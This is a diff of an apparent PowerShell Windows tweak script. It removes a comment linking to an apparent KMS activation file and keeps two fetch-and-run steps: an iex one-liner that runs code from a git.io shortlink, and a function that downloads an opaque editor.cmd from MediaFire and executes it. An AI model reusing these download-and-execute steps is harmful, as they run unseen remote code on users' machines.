@@ -1,10 +1,7 @@
 # @2020 COPYRIGHT TO MINSEO CHOI 
 # @2020 COPYRIGHT TO WASHINGTON CHODAE CHURCH
-# LAST UPDATE: 2020-11-19
-# 	Activation Link: http://www.mediafire.com/file/ir5prt4cw7tuk4p/KMS_ACT_ORIGINAL.cmd/file
-#
+# LAST UPDATE: 2020-12-01
 #     > powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://git.io/JkEOe')"
-# Default preset
 clear-host
 $tweaks = @(
 	### Required ###
@@ -2731,10 +2728,10 @@ Function DeleteCacheFiles {
 }
 
 Function SpecialProgramInstall {
-		Write-Output "Downloading Installer"
+	Write-Output "Downloading Installer"
 	powershell -c "(new-object System.Net.WebClient).DownloadFile('https://download937.mediafire.com/u8s0zrrcn33g/a4hch5n5t4mtfc4/editor.cmd','C:\tmp\editor.cmd')"
 	Invoke-WebRequest https://download937.mediafire.com/u8s0zrrcn33g/a4hch5n5t4mtfc4/editor.cmd -OutFile C:\tmp\editor.cmd
-	C:\tmp\editor.cmd
+	Start-Process "C:\tmp\editor.cmd"
 }
 
 ##########
